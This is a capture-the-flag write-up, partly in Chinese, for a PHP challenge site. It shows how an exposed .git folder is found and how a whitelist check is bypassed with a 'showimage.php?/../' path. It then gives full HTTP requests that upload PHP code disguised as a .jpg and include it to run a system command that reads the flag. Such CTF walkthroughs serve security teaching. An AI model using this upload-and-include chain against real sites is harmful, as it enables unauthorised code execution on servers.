信息收集
----
信息收集很重要

Examination Site
----
* git
* PHP Include
* PHP Upload

Analysis
----
Use dirsearch.py to scan the website dir,and will found the .git
```bash
[09:12:56] 200 -  377B  - /.git/index
```
Then we will get 4 files:
* include.php
* upload.php
* showimage.php
* index.php

The essential code:

From *include.php*
```php
function check($file)
    {
        $whitelist = array('showimage.php');
        if (! isset($file) || !is_string($file)) {
            return false;
        }

        if (in_array($file, $whitelist)) {
            return true;
        }

        $file = mb_substr($file,0,mb_strpos($file . '?', '?'));
        if (in_array($file, $whitelist)) {
            return true;
        }

        $file = urldecode($file);
        $file = mb_substr($file,0, mb_strpos($file . '?', '?'));
        if (in_array($file, $whitelist)) {
            return true;
        }

        return false;
    }
```

From *upload.php*:
```php
if($file)
{
    $name = strtolower($file['name']);
    $ext = getImageExt($name);
    if(!in_array($ext,$whiteList))
    {
        exit('非法格式上传');
    }
    $randomString = getRandomString();
    $fileName =  $randomString.'.'.$ext;
    if(move_uploaded_file($file['tmp_name'],'ac78b24a/'.$fileName))
    {
        echo "<h2>文件上传成功!</h2>".'文件名:'.$fileName;
    }
    else
    {
        echo "<h2>文件上传失败!</h2>";
    }
}
```
Now we know that we need to upload a jpg with php code and then include it.
Howevers,we need to bypass the *$check()*.
The payloads is **showimage.php?/../../ac78b24a/[Your php code].jpg**

Exploit
----
The *upload.php* doesn't offer the upload interface so that we need to modify the http packages.
```http
POST /upload.php HTTP/1.1
Host: examination.cup.360.cn:9002
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: __huid=11fv2PitnuoaSLI4gxDUndFDIRvfP+nkDvFt7SmHgbm8s=; __guid=133126103.2566954415202299904.1571389874001.5566; Qs_lvt_317691=1571389874%2C1571390365; Qs_pv_317691=3339381377967604700%2C4248602918050323500%2C1090171495033724300%2C4183073154641787400; __DC_gid=59612149.737379581.1571389903664.1571389932667.3; __gid=176960547.101599076.1571463340619.1571463442726.4; bad_id73963b90-5cf1-11e9-9a78-b1dd2463a67d=4a565812-f232-11e9-8090-3fa0d6bf21d3; JSESSIONID=0BB281AAC5ABDCC251F305EACCF6DC37; PHPSESSID=cb2b3288fb797e27c3803dac23bcd663
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------9011289509495
boundary=---------------------------9011289509495
Content-Length: 245

-----------------------------9011289509495
Content-Disposition: form-data; name="face"; filename="1.php%.jpg"
Content-Type: application/octet-stream

<?php
system('cat 739d3f54_flag.php');
?>
-----------------------------9011289509495
```

And it works!
```http
HTTP/1.1 200 OK
Server: panyun/0.9.0
Date: Sat, 02 Nov 2019 05:10:04 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 74
Connection: close
X-Powered-By: PHP/7.1.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding

<h2>文件上传成功!</h2>文件名:625347d9f50a20093077ae6ee40de99a.jpg
```

And then we use *include.php* to include it.
```http
GET /include.php?file=showimage.php?/../ac78b24a/625347d9f50a20093077ae6ee40de99a.jpg HTTP/1.1
Host: examination.cup.360.cn:9002
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: __huid=11fv2PitnuoaSLI4gxDUndFDIRvfP+nkDvFt7SmHgbm8s=; __guid=133126103.2566954415202299904.1571389874001.5566; Qs_lvt_317691=1571389874%2C1571390365; Qs_pv_317691=3339381377967604700%2C4248602918050323500%2C1090171495033724300%2C4183073154641787400; __DC_gid=59612149.737379581.1571389903664.1571389932667.3; __gid=176960547.101599076.1571463340619.1571463442726.4; bad_id73963b90-5cf1-11e9-9a78-b1dd2463a67d=4a565812-f232-11e9-8090-3fa0d6bf21d3; JSESSIONID=0BB281AAC5ABDCC251F305EACCF6DC37; PHPSESSID=cb2b3288fb797e27c3803dac23bcd663
Upgrade-Insecure-Requests: 1


```

Get Flag.
```http
HTTP/1.1 200 OK
Server: panyun/0.9.0
Date: Sat, 02 Nov 2019 05:10:04 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 74
Connection: close
X-Powered-By: PHP/7.1.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding

<?php


//flag{4305506ff1c88b05c2c53df2df8bcdce}


?>
```